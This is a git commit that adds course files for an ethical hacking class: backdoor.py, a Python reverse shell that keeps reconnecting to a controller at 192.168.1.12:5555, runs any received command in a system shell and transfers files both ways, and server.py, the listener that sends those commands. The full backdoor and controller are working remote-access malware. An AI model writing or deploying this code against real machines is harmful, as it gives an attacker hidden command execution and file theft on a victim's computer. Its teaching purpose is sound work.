5cb05f6229a97ec4bb49086e5486ec2853a69ec9
Krittin Thirasak <krittin.thirasak@gmail.com>
2024-06-13 15:13:36 +0700

    download assignment files

---
+++ backdoor.py
@@ -0,0 +1,102 @@
+################################################
+# Author: Watthanasak Jeamwatthanachai, PhD    #
+# Class: SIIT Ethical Hacking, 2023-2024       #
+################################################
+
+# Import necessary Python modules
+import socket  # For network communication
+import time  # For adding delays
+import subprocess  # For running shell commands
+import json  # For encoding and decoding data in JSON format
+import os  # For interacting with the operating system
+
+
+# Function to send data in a reliable way (encoded as JSON)
+def reliable_send(data):
+    jsondata = json.dumps(data)  # Convert data to JSON format
+    s.send(jsondata.encode())  # Send the encoded data over the network
+
+
+# Function to receive data in a reliable way (expects JSON data)
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
+            return json.loads(data)  # Parse the received JSON data
+        except ValueError:
+            continue
+
+
+# Function to establish a connection to a remote host
+def connection():
+    while True:
+        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
+        try:
+            # Connect to a remote host with IP '192.168.1.12' and port 5555
+            s.connect(('192.168.1.12', 5555))
+            # Once connected, enter the shell() function for command execution
+            shell()
+            # Close the connection when done
+            s.close()
+            break
+        except:
+            # If a connection error occurs, retry the connection
+            connection()
+
+
+# Function to upload a file to the remote host
+def upload_file(file_name):
+    f = open(file_name, 'rb')  # Open the specified file in binary read mode
+    s.send(f.read())  # Read and send the file's contents over the network
+
+
+# Function to download a file from the remote host
+def download_file(file_name):
+    f = open(file_name, 'wb')  # Open a file for binary write mode
+    s.settimeout(1)  # Set a timeout for receiving data
+    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
+    while chunk:
+        f.write(chunk)  # Write the received data to the file
+        try:
+            chunk = s.recv(1024)  # Receive the next chunk
+        except socket.timeout as e:
+            break
+    s.settimeout(None)  # Reset the timeout setting
+    f.close()  # Close the file when done
+
+
+# Main shell function for command execution
+def shell():
+    while True:
+        # Receive a command from the remote host
+        command = reliable_recv()
+        if command == 'quit':
+            # If the command is 'quit', exit the shell loop
+            break
+        elif command == 'clear':
+            # If the command is 'clear', do nothing (used for clearing the screen)
+            pass
+        elif command[:3] == 'cd ':
+            # If the command starts with 'cd ', change the current directory
+            os.chdir(command[3:])
+        elif command[:8] == 'download':
+            # If the command starts with 'download', upload a file to the remote host
+            upload_file(command[9:])
+        elif command[:6] == 'upload':
+            # If the command starts with 'upload', download a file from the remote host
+            download_file(command[7:])
+        else:
+            # For other commands, execute them using subprocess
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
+            result = result.decode()  # Decode the output to a string
+            # Send the command execution result back to the remote host
+            reliable_send(result)
+
+
+# Create a socket object for communication over IPv4 and TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Start the connection process by calling the connection() function
+connection()
---
+++ server.py
@@ -0,0 +1,106 @@
+################################################
+# Author: Watthanasak Jeamwatthanachai, PhD    #
+# Class: SIIT Ethical Hacking, 2023-2024       #
+################################################
+
+# Import necessary libraries
+import socket  # This library is used for creating socket connections.
+import json  # JSON is used for encoding and decoding data in a structured format.
+import os  # This library allows interaction with the operating system.
+
+
+# Function to send data reliably as JSON-encoded strings
+def reliable_send(data):
+    # Convert the input data into a JSON-encoded string.
+    jsondata = json.dumps(data)
+    # Send the JSON-encoded data over the network connection after encoding it as bytes.
+    target.send(jsondata.encode())
+
+
+# Function to receive data reliably as JSON-decoded strings
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
+            # and remove any trailing whitespace characters.
+            data = data + target.recv(1024).decode().rstrip()
+            # Parse the received data as a JSON-decoded object.
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+# Function to upload a file to the target machine
+def upload_file(file_name):
+    # Open the specified file in binary read ('rb') mode.
+    f = open(file_name, 'rb')
+    # Read the contents of the file and send them over the network connection to the target.
+    target.send(f.read())
+
+
+# Function to download a file from the target machine
+def download_file(file_name):
+    # Open the specified file in binary write ('wb') mode.
+    f = open(file_name, 'wb')
+    # Set a timeout for receiving data from the target (1 second).
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        # Write the received data (chunk) to the local file.
+        f.write(chunk)
+        try:
+            # Attempt to receive another chunk of data from the target.
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    # Reset the timeout to its default value (None).
+    target.settimeout(None)
+    # Close the local file after downloading is complete.
+    f.close()
+
+
+# Function for the main communication loop with the target
+def target_communication():
+    while True:
+        # Prompt the user for a command to send to the target.
+        command = input('* Shell~%s: ' % str(ip))
+        # Send the user's command to the target using the reliable_send function.
+        reliable_send(command)
+        if command == 'quit':
+            # If the user enters 'quit', exit the loop and close the connection.
+            break
+        elif command == 'clear':
+            # If the user enters 'clear', clear the terminal screen.
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            # If the user enters 'cd', change the current directory on the target (not implemented).
+            pass
+        elif command[:8] == 'download':
+            # If the user enters 'download', initiate the download of a file from the target.
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            # If the user enters 'upload', initiate the upload of a file to the target.
+            upload_file(command[7:])
+        else:
+            # For other commands, receive and print the result from the target.
+            result = reliable_recv()
+            print(result)
+
+
+# Create a socket for the server
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
+sock.bind(('192.168.1.12', 5555))
+
+# Start listening for incoming connections (maximum 5 concurrent connections).
+print('[+] Listening For The Incoming Connections')
+sock.listen(5)
+
+# Accept incoming connection from the target and obtain the target's IP address.
+target, ip = sock.accept()
+print('[+] Target Connected From: ' + str(ip))
+
+# Start the main communication loop with the target by calling target_communication.
+target_communication()
